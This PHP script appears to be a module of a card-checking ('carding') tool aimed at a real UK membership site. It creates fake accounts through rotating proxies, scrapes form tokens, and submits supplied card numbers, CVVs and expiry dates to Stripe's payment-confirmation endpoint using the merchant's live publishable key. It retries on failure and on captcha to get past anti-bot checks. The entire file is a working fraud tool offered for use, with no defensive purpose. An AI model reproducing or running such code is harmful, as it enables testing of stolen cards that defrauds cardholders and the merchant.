<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$r1 = $this->curlx->Get('https://therelationshipplace.co.uk/register/the-pre-commitment-plan#mepr_jump', null, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$pm_id = $this->getstr($r1->body, '"mepr_payment_method" value="', '"');

if (empty($pm_id)) {
	$empty = 'First Request Token is Empty!';

	goto start;
}

$data = [
	'mepr_process_signup_form' => 'Y',
	'mepr_product_id' => '998',
	'user_first_name' => $fake->first,
	'user_last_name' => $fake->last,
	'mepr-geo-country' => '',
	'user_email' => $fake->email,
	'mepr_user_password' => '#CBAzyx321',
	'mepr_user_password_confirm' => '#CBAzyx321',
	'mp-pass-strength' => '3',
	'mepr_coupon_code' => '',
	'mepr_payment_method' => $pm_id,
	'mepr_agree_to_privacy_policy' => 'on',
	'meprmailchimptags_opt_in' => 'on',
	'mepr_no_val' => ''
];

$r2 = $this->curlx->Post('https://therelationshipplace.co.uk/register/the-pre-commitment-plan', http_build_query($data), null, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$transaction_id = $this->getstr($r2->body, 'mepr_transaction_id" value="', '"');

if (empty($transaction_id)) {
	$empty = 'Second Request Token is Empty';

	goto start;
}

$data = [
	'mepr_transaction_id' => $transaction_id,
	'address_required' => '0',
	'card-first-name' => $fake->first,
	'card-last-name' => $fake->last,
	'action' => 'mepr_stripe_create_payment_client_secret',
	'mepr_payment_method' => $pm_id
];

$r3 = $this->curlx->Post('https://therelationshipplace.co.uk/wp-admin/admin-ajax.php', http_build_query($data), null, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$json_r3 = json_decode($r3->body);

if (!$json_r3->success || !isset($json_r3->data->client_secret, $json_r3->data->payment_intent_id)) {
	$empty = 'Third Request Token is Empty!';

	goto start;
}

$client_secret = $json_r3->data->client_secret;

$payment_intent_id = $json_r3->data->payment_intent_id;

$data = 'return_url=https%3A%2F%2Ftherelationshipplace.co.uk%2Fthank-you-pre-commitment-plan%3Fmembership%3Dthe-pre-commitment-plan%26membership_id%3D998%26transaction_id%3D'.$transaction_id.'&payment_method_data[billing_details][address][postal_code]=10509&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][name]='.$fake->first.'+'.$fake->last.'&payment_method_data[type]=card&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_year]='.$yy.'&payment_method_data[card][exp_month]='.$mm.'&payment_method_data[payment_user_agent]=stripe.js%2F72c5b37d6%3B+stripe-js-v3%2F72c5b37d6%3B+payment-element&payment_method_data[time_on_page]='.rand(50000, 100000).'&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51KHpxDBTUBrCM39wG5YDQM8oqMXEVVC6R5rOIBthZFEvOIrxj5LPZo5PqMXLhNmFKWahNAVJQgawtLbxktJA2eic00wCBbaHlk&_stripe_version=2022-08-01&client_secret='.$client_secret;

$r4 = $this->curlx->Post('https://api.stripe.com/v1/payment_intents/'.$payment_intent_id.'/confirm', $data, null, $cookie, $server['proxy']);

if (!$r4->success) goto start;

if (strpos($r4->body, 'verify_challenge') !== false) {
	$empty = 'Fourth Request Contains HCaptcha!';

	goto start;
}

$json_r4 = json_decode($r4->body);

if (isset($json_r4->error)) {
	$status = $this->response->ErrorHandler($json_r4->error);

	goto end;
}

$status = $this->response->Stripe($r4->body);

end: